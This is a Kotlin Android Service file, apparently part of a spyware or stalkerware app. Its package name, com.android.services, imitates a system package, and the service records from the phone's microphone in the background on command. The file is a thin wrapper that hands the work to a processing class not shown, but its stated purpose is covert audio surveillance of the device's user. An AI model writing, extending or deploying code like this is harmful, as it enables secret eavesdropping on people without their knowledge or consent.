package com.android.services.services.micBug

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [MicBugCommandService] is a Service to record the Mic Recording in Background,
 * This service receives a Command to start recording using phone's microphone,
 * and immediately starts recording If Device's Microphone is Free
 */

@AndroidEntryPoint
class MicBugCommandService : Service() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var micBugProcessingI: IBackgroundProcessing

    override fun onBind(arg0: Intent): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        micBugProcessingI =
            MicBugCommandProcessingBaseImplI(this, localDatabaseSource, coroutineScope)
        micBugProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return micBugProcessingI.onStartCommand(intent, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        micBugProcessingI.onDestroy()
    }
}